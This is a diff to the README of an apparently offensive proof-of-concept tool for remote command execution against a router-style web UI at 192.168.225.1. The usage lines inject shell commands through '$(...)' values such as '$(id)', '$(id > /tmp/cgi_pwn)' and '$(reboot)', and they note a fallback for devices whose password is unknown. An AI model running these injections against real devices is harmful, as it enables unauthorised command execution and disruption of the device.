@@ -71,35 +71,25 @@ bare command (wrapped automatically). Nothing is hardcoded.
 
 ```sh
 # your own webui password
-python3 poc/jodu5174x_pinlock_rce.py https://192.168.225.1 --ask-pass --cmd '$(id)'
+python jodu5174x_pinlock_rce.py https://192.168.225.1 --ask-pass --cmd '$(id > /tmp/cgi_pwn)'
 
 # with a password
-python3 poc/jodu5174x_pinlock_rce.py https://192.168.225.1 --password 'my-Pw' --cmd '$(id)'
+python jodu5174x_pinlock_rce.py https://192.168.225.1 --password 'my-Pw' --cmd '$(id)'
 
 # any other payload
-python3 poc/jodu5174x_pinlock_rce.py https://192.168.225.1 --password 'my-Pw' --cmd '$(id > /tmp/cgi_pwn)'
+python jodu5174x_pinlock_rce.py https://192.168.225.1 --password 'my-Pw' --cmd '$(reboot)'
 
 # factory configuration / unknown password: falls back automatically
-python3 poc/jodu5174x_pinlock_rce.py https://192.168.225.1 --cmd '$(id)'
+python jodu5174x_pinlock_rce.py https://192.168.225.1 --cmd '$(id)'
 ```
-
-### Shell (curl only)
-
-```sh
-./poc/jodu5174x_pinlock_rce.sh 192.168.225.1 '$(id)'
-./poc/jodu5174x_pinlock_rce.sh 192.168.225.1 '$(id)' 'my-Pw'
-PASSWORD='my-Pw' ./poc/jodu5174x_pinlock_rce.sh 192.168.225.1 '$(id)'
-```
-
 ### IPv6
 
 The target may be an IPv6 literal, bare or bracketed; it is bracketed
 automatically and a zone id is URL-encoded.
 
 ```sh
-python3 poc/jodu5174x_pinlock_rce.py 2001:db8::1 --cmd '$(id)'
-python3 poc/jodu5174x_pinlock_rce.py 'https://[2001:db8::1]:8443' --cmd '$(id)'
-./poc/jodu5174x_pinlock_rce.sh '[fe80::1%25eth0]' '$(id)'
+python jodu5174x_pinlock_rce.py 2001:db8::1 --cmd '$(id)'
+python jodu5174x_pinlock_rce.py 'https://[2001:db8::1]:8443' --cmd '$(id)'
 ```
 
 For link-local targets use the interface zone, written `%25` in the URL.
